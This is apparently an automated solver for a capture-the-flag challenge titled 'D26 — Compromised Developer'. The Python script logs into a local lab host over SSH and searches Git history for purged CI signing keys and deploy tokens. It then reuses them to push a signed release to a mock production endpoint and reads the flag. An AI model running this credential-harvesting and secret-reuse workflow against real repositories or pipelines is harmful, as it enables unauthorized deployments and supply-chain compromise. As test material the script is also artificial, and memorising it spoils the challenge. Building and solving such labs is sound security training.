#!/usr/bin/env python3
"""
Automated Solver for D26 — Compromised Developer
Connects to the challenge SSH instance, extracts credentials from Git history,
executes the signed CI deployment to production mock, and retrieves the flag.
"""

import sys
import os
import re
import json
import time
import argparse
import subprocess

def solve_ssh(host="127.0.0.1", port=2222, user="developer", password="developer"):
    print(f"[*] Connecting to D26 Workstation at {host}:{port} as {user}...")

    # Helper command execution over SSH using sshpass or pty or standard ssh
    def run_ssh_cmd(cmd):
        ssh_cmd = [
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "LogLevel=ERROR",
            "-p", str(port),
            f"{user}@{host}",
            cmd
        ]
        # Use sshpass or expect if available, or pexpect/paramiko if installed
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=user, password=password, timeout=10)
            stdin, stdout, stderr = client.exec_command(cmd)
            out = stdout.read().decode("utf-8")
            err = stderr.read().decode("utf-8")
            client.close()
            return out, err
        except ImportError:
            # Fallback to sshpass or direct execution
            full_cmd = ["sshpass", "-p", password] + ssh_cmd
            res = subprocess.run(full_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=15)
            return res.stdout, res.stderr

    # Step 1: Enumerate Git history for deleted release keys
    print("[*] Step 1: Investigating Git commit history for purged CI release secrets...")
    repo_cmd = "cd ~/projects/latveria-telemetry-dispatch && git log --all -p -S 'DOOM_CI_SIGNING_KEY'"
    out, err = run_ssh_cmd(repo_cmd)
    
    if "DOOM_CI_SIGNING_KEY" not in out:
        # Try finding all git objects
        repo_cmd = "cd ~/projects/latveria-telemetry-dispatch && git log --all -p"
        out, err = run_ssh_cmd(repo_cmd)

    signing_key_match = re.search(r"DOOM_CI_SIGNING_KEY=([a-zA-Z0-9_]+)", out)
    deploy_token_match = re.search(r"DOOM_DEPLOY_TOKEN=([a-zA-Z0-9_\.\-]+)", out)
    caller_id_match = re.search(r"DOOM_CALLER_ID=([a-zA-Z0-9_]+)", out)

    if not signing_key_match or not deploy_token_match:
        print(f"[!] Failed to extract secrets from Git history. Output was:\n{out[:500]}")
        sys.exit(1)

    signing_key = signing_key_match.group(1)
    deploy_token = deploy_token_match.group(1)
    caller_id = caller_id_match.group(1) if caller_id_match else "latveria_ci_agent_99"

    print(f"[+] Recovered CI Signing Key: {signing_key}")
    print(f"[+] Recovered Deploy Token:   {deploy_token}")
    print(f"[+] Recovered Caller ID:      {caller_id}")

    # Step 2: Execute CI deployment to Production Mock
    print("[*] Step 2: Dispatching signed deployment request to Production Mock...")
    deploy_cmd = (
        f"cd ~/projects/latveria-telemetry-dispatch && "
        f"python3 ci/pipeline.py "
        f"--key {signing_key} "
        f"--token {deploy_token} "
        f"--caller {caller_id} "
        f"--action PROD_DISPATCH_RELEASE "
        f"--endpoint http://127.0.0.1:8080/api/v1/telemetry/deploy"
    )
    deploy_out, deploy_err = run_ssh_cmd(deploy_cmd)
    print(f"[+] Deployment Script Output:\n{deploy_out}")

    # Step 3: Extract Flag
    flag_match = re.search(r"(DOOM\{[^\}]+\}|FLAG\{[^\}]+\})", deploy_out)
    if not flag_match:
        print(f"[!] Flag not found in deployment response! Output: {deploy_out}\nError: {deploy_err}")
        sys.exit(1)

    flag = flag_match.group(1)
    print(f"\n========================================================")
    print(f"[SUCCESS] Flag Retrieved: {flag}")
    print(f"========================================================\n")
    return flag


def main():
    parser = argparse.ArgumentParser(description="D26 Solver")
    parser.add_argument("--host", default="127.0.0.1", help="Challenge host")
    parser.add_argument("--port", type=int, default=2222, help="SSH port (default: 2222 for compose)")
    parser.add_argument("--user", default="developer", help="SSH user")
    parser.add_argument("--password", default="developer", help="SSH password")
    args = parser.parse_args()

    solve_ssh(args.host, args.port, args.user, args.password)


if __name__ == "__main__":
    main()
